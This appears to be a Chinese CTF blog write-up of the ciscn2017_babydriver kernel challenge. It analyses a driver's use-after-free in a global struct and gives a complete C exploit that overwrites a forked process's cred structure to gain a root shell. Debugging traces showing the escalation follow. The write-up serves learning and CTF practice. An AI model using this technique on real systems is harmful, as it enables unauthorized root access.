---
title: ciscn2017_babydriver
top: false
comment: false
lang: zh-CN
date: 2021-11-13 08:34:17
tags:
categories:
  - CTF
  - PWN
  - kernel pwn
  - wp
---

# ciscn2017_babydriver

## 信息收集

下载源文件；

检查bzImage；

```text
$ file bzImage 
bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA
$ strings bzImage | grep "gcc"
4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017
```

下载对应内核版本并编译；

解包文件系统映像；

```text
unzipcpio

    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

### IDA pro

把解压后得到的文件lib/modules/4.4.72/babydriver.ko放到ida64中分析；

没有去除符号表，使用`shift+F9`来查看结构体，可以得到：

```NASM
00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)
00000000                                         ; XREF: .bss:babydev_struct/r
00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r
00000000                                         ; babyopen+26/w ... ; offset
00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w
00000008                                         ; babyioctl+3C/w ...
00000010 babydevice_t    ends
00000010
```

查看主要函数；

#### babyioctl

```C
// local variable allocation has failed, the output may be wrong!
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 result; // rax

  _fentry__(filp, *(_QWORD *)&command, arg);
  v4 = v3;
  if ( command == 0x10001 )                     // 定义命令0x10001,
  {
    kfree(babydev_struct.device_buf);           // 释放结构体中的device_buf
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);// 根据传递的size重新申请内存，设置为device_buf_len
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 0x24000C0LL);
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB, v3);
    result = -22LL;
  }
  return result;
}
```

#### babyopen

```C
int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
    // 申请0x40大小的空间，存储在全局变量babydev_struct.device_buf上
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 0x40LL;       // 更新babydev_struct.device_buf_len
  printk("device open\n", 0x24000C0LL);
  return 0;
}
```

#### babyread

```C
ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);

  if ( !babydev_struct.device_buf )             // buffer和size都是用户传递的参数
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )     // 检查长度是否小于device_buf_len
  {
    v6 = v4;
    copy_to_user(buffer);                       // 将device_buf中的数据拷贝到buffer中
    result = v6;
  }
  return result;
}
```

#### babywrite

```C
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )     // 检查长度
  {
    v6 = v4;
    copy_from_user();                           // 将buffer拷贝到全局变量中
    result = v6;
  }
  return result;
}
```

#### babyrelease

```C
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);            // 释放空间
  printk("device release\n", filp);
  return 0;
}
```

babydriver_init()完成对/dev/babydev设备的初始化；

```C
int __cdecl babydriver_init()
{
  int v0; // edx
  __int64 v1; // rsi
  int v2; // ebx
  class *v3; // rax
  __int64 v4; // rax

  if ( (signed int)alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )
  {
    cdev_init(&cdev_0, &fops);
    v1 = babydev_no;
    cdev_0.owner = &_this_module;
    v2 = cdev_add(&cdev_0, babydev_no, 1LL);
    if ( v2 >= 0 )
    {
      v3 = (class *)_class_create(&_this_module, "babydev", &babydev_no);
      babydev_class = v3;
      if ( v3 )
      {
        v4 = device_create(v3, 0LL, babydev_no, 0LL, "babydev");
        v0 = 0;
        if ( v4 )
          return v0;
        printk(&unk_351, 0LL);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B, "babydev");
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327, v1);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v2;
  }
  printk(&unk_309, 0LL);
  return 1;
}
```

babydriver_exit() 完成对 /dev/babydev 设备的清理

```C
void __cdecl babydriver_exit()
{
  device_destroy(babydev_class, babydev_no);
  class_destroy(babydev_class);
  cdev_del(&cdev_0);
  unregister_chrdev_region(babydev_no, 1LL);
}
```

## 漏洞利用

没有有用户态的溢出漏洞，但是注意到babydev_stuct是一个全局的结构体，因此就存在一个伪条件竞争的UAF漏洞；

这也就意味着，如果同时打开两个设备，第二个设备写入的数据将会覆盖第一个设备的空间；同样，如果释放第二个，那么第一个设备也会被释放；

利用uaf漏洞来修改cred结构体中的权限；

1. 连续开启两个设备，通过ioctl修改大小为cred结构体大小；
2. 释放其中一个设备，fork一个新进程，使这个进程的cred空间和之前释放的空间重叠；
3. 通过另一个文件描述符对该空间进行写操作，将uid，gid改为0，实现提权到root；

### 步骤

#### 两次打开设备

为后续uaf做准备；

```C
int fd1 = open("/dev/babydev", 2");
int fd2 = open("/dev/babydev", 2");
```

#### 找到内核版本对应的cred

在内核源码目录中的linux-4.4.72/include/linux/cred.h；

```C
struct cred {
  atomic_t  usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
  atomic_t  subscribers;  /* number of processes subscribed */
  void    *put_addr;
  unsigned  magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD  0x44656144
#endif
  kuid_t    uid;    /* real UID of the task */
  kgid_t    gid;    /* real GID of the task */
  kuid_t    suid;    /* saved UID of the task */
  kgid_t    sgid;    /* saved GID of the task */
  kuid_t    euid;    /* effective UID of the task */
  kgid_t    egid;    /* effective GID of the task */
  kuid_t    fsuid;    /* UID for VFS ops */
  kgid_t    fsgid;    /* GID for VFS ops */
  unsigned  securebits;  /* SUID-less security management */
  kernel_cap_t  cap_inheritable; /* caps our children can inherit */
  kernel_cap_t  cap_permitted;  /* caps we're permitted */
  kernel_cap_t  cap_effective;  /* caps we can actually use */
  kernel_cap_t  cap_bset;  /* capability bounding set */
  kernel_cap_t  cap_ambient;  /* Ambient capability set */
#ifdef CONFIG_KEYS
  unsigned char  jit_keyring;  /* default keyring to attach requested
           * keys to */
  struct key __rcu *session_keyring; /* keyring inherited over fork */
  struct key  *process_keyring; /* keyring private to this process */
  struct key  *thread_keyring; /* keyring private to this thread */
  struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
  void    *security;  /* subjective LSM security */
#endif
  struct user_struct *user;  /* real user ID subscription */
  struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
  struct group_info *group_info;  /* supplementary groups for euid/fsgid */
  struct rcu_head  rcu;    /* RCU deletion hook */
};
```

写exp

```c
/*************************************************************************
    > File Name: exploit.c
    > Author: K1ose
    > Mail: klose@jk404.cn
    > Created Time: Fri 05 Nov 2021 08:53:41 PM CST
 ************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
    // 打开两次设备
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    // 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
    ioctl(fd1, 0x10001, 0xa8);

    // 释放 fd1
    close(fd1);

    // 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
    int pid = fork();
    if(pid < 0)
    {
        puts("[-] fork error!");
        exit(0);
    }

    else if(pid == 0)
    {
        // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
        char zeros[30] = {0};
        write(fd2, zeros, 28);

        if(getuid() == 0)
        {
            puts("[+] root now.");
            system("/bin/sh");
            exit(0);
        }
    }

    else
    {
        wait(NULL);
    }
    close(fd2);

    return 0;
}

```

使用`gcc exploit.c -static -o exploit`编译exp，kernel中没有libc；

将exp可执行文件放到解压后的目录core/tmp下，重新打包后，将文件系统映像放回主目录；

```
cp exploit core/tmp
cd core
find . | cpio -o --format=newc > rootfs.cpio
cp rootfs.cpio ..
cd ..
```

sudo执行boot.sh；

```
sudo ./boot.sh
```

#### 提权

```
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ ./tmp/exploit 
[   33.920853] device open
[   33.921335] device open
[   33.921826] alloc done
[   33.922365] device release
[+] root now.
/ # id
uid=0(root) gid=0(root) groups=1000(ctf)
/ # 
```

### 调试

先提取带符号的源码vmlinux；

```
extract-vmlinux ./bzImage > vmlinux
```

可以先以root身份执行`boot.sh`，找到.text段的地址；

```
/sys/modules/core/section/.text
或者
/proc/modules
```

这里是`/proc/modules`，可以得到：

```
/ # cat /proc/modules 
babydriver 16384 0 - Live 0xffffffffc0000000 (OE)
```

启动gdb；

```
gdb ./vmlinux -q
```

导入符号表；

```
add-symbol-file core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000
```

可以得到：

```
add symbol table from file "core/lib/modules/4.4.72/babydriver.ko" at
	.text_addr = 0xffffffffc0000000
Reading symbols from core/lib/modules/4.4.72/babydriver.ko...done.
```

远程调试设置，在`boot.sh`中加入调试设置；

```
-gdb tcp::1234
或者
-s
```

这时候就可以一下断点了；

这里在以下三个位置分别设置断点；

```
pwndbg> b babyopen
Breakpoint 1 at 0xffffffffc0000030: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 28.
pwndbg> b babyioctl
Breakpoint 2 at 0xffffffffc0000080: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 56.
pwndbg> b babywrite
Breakpoint 3 at 0xffffffffc00000f0: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 48.
```

连接qemu；

```
target remote localhost:1234
```

接着放程序通过；

```
pwndbg> c
Continuing.
```

在qemu中执行exploit程序，来观察调用的情况；

```
/ $ ./tmp/exploit 
[  355.326009] device open
```

可以看到程序在babyopen处断下；

```
 ► 0xffffffffc0000030 <babyopen>       nop    
   0xffffffffc0000035 <babyopen+5>     push   rbp
   0xffffffffc0000036 <babyopen+6>     mov    rdi, qword ptr [rip - 0x3de3bc0d]
   0xffffffffc000003d <babyopen+13>    mov    edx, 0x40
   0xffffffffc0000042 <babyopen+18>    mov    esi, 0x24000c0
   0xffffffffc0000047 <babyopen+23>    mov    rbp, rsp
   0xffffffffc000004a <babyopen+26>    call   0xffffffff811ea180
```

当执行到`<babyopen+38>`时，查看对应指针地址的内容：

`babydev_struct.dev_buf`的地址为`0xffffffffc00024d0`，`babydev_struct.dev_buf_len`的地址为`0xffffffffc00024d8`；

```
   0xffffffffc000004f <babyopen+31>    mov    rdi, -0x3fffefcc
 ► 0xffffffffc0000056 <babyopen+38>    mov    qword ptr [rip + 0x2473], rax
   0xffffffffc000005d <babyopen+45>    mov    qword ptr [rip + 0x2470], 0x40
   0xffffffffc0000068 <babyopen+56>    call   0xffffffff8118b077
=====================================================================
pwndbg> x/10gx 0xffffffffc00024d0
0xffffffffc00024d0:	0x0000000000000000	0x0000000000000000
0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000
0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000
0xffffffffc0002500:	0x0000000000000000	0x0000000000000000
0xffffffffc0002510:	0x0000000000000000	0x0000000000000000

```

此时还没有打开，因此都为`0`；

执行完后，结构体变量`dev_buf`指向了缓冲区地址`0xffff880003d1ea00`，而`babydev_struct.dev_buf_len`为`0x40`；

```
pwndbg> x/10gx 0xffffffffc00024d0
0xffffffffc00024d0:	0xffff880003d1ea00	0x0000000000000040
0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000
0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000
0xffffffffc0002500:	0x0000000000000000	0x0000000000000000
0xffffffffc0002510:	0x0000000000000000	0x0000000000000000
```

缓冲区地址`0xffff880003d1ea00`的内容为：

```
pwndbg> x/30gx 0xffff880003d1ea00
0xffff880003d1ea00:	0xffff880003d1ea80	0xffff880003d36190
0xffff880003d1ea10:	0xdead000000000100	0xdead000000000200
0xffff880003d1ea20:	0xffff880003d1ede0	0x0000000000000000
0xffff880003d1ea30:	0x0000000000000000	0x0000000000001450
0xffff880003d1ea40:	0xffff880003d1ec00	0xffff880003d360a0
```

执行`c`，让程序到第二次调用`babyopen`时断下，并如第一次一样查看dev_buf指针的指向地址，以及查看指向地址buf中的内容；

会发现，`dev_buf`的地址仍然是`0xffffffffc00024d0`，只是buffer分配了新的值；

```
pwndbg> x/10gx 0xffffffffc00024d0
0xffffffffc00024d0:	0xffff880003d1ea80	0x0000000000000040
0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000
0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000
0xffffffffc0002500:	0x0000000000000000	0x0000000000000000
0xffffffffc0002510:	0x0000000000000000	0x0000000000000000
```

执行`c`，让程序到执行`babyioctl`时断下，执行`ni`，并在即将赋值时停下；

```
   0xffffffffc00000ae <babyioctl+46>    mov    rdi, -0x3fffefbf
 ► 0xffffffffc00000b5 <babyioctl+53>    mov    qword ptr [rip + 0x2414], rax
   0xffffffffc00000bc <babyioctl+60>    mov    qword ptr [rip + 0x2415], rbx
   0xffffffffc00000c3 <babyioctl+67>    call   0xffffffff8118b077
```

在结构体长度赋值之前，查看一下`dev_buf`和`dev_buf_len`；

```
pwndbg> x/10gx 0xffffffffc00024d0
0xffffffffc00024d0:	0xffff880003d1ea80	0x0000000000000040
0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000
0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000
0xffffffffc0002500:	0x0000000000000000	0x0000000000000000
0xffffffffc0002510:	0x0000000000000000	0x0000000000000000
```

执行结束后再次查看；

```
pwndbg> x/10gx 0xffffffffc00024d0
0xffffffffc00024d0:	0xffff880003d70540	0x00000000000000a8
0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000
0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000
0xffffffffc0002500:	0x0000000000000000	0x0000000000000000
0xffffffffc0002510:	0x0000000000000000	0x0000000000000000
```

可以看到，buffer的地址又重新分配了，而`dev_buf_len`被修改为了`cred`结构体的大小；

执行`c`，程序执行到`babywrite`时停下，此时`fork`的新进程的`cred`结构体已经被放到了buffer处，也就是`0xffff880003d70540`处；

可以瞅一眼；

```
pwndbg> x/10gx 0xffff880003d70540
0xffff880003d70540:	0x000003e800000002	0x000003e8000003e8
0xffff880003d70550:	0x000003e8000003e8	0x000003e8000003e8
0xffff880003d70560:	0x00000000000003e8	0x0000000000000000
0xffff880003d70570:	0x0000000000000000	0x0000000000000000
0xffff880003d70580:	0x0000003fffffffff	0x0000000000000000
```

可以看到很多`0x3e8`，其实这就是`1000`，代表了用户的权限；

```
pwndbg> p 0x3e8
$1 = 1000
```

在执行完`babywrite`后，再看一下该地址的内容；

```
after this ->  0xffffffffc0000119 <babywrite+41>    call   0xffffffff813e6520

pwndbg> x/10gx 0xffff880003d70540
0xffff880003d70540:	0x0000000000000000	0x0000000000000000
0xffff880003d70550:	0x0000000000000000	0x000003e800000000
0xffff880003d70560:	0x00000000000003e8	0x0000000000000000
0xffff880003d70570:	0x0000000000000000	0x0000000000000000
0xffff880003d70580:	0x0000003fffffffff	0x0000000000000000
```

可以看到前0x28bytes被修改为0；

执行c，达到提权效果；

```
/ # id
uid=0(root) gid=0(root) groups=1000(ctf)
```

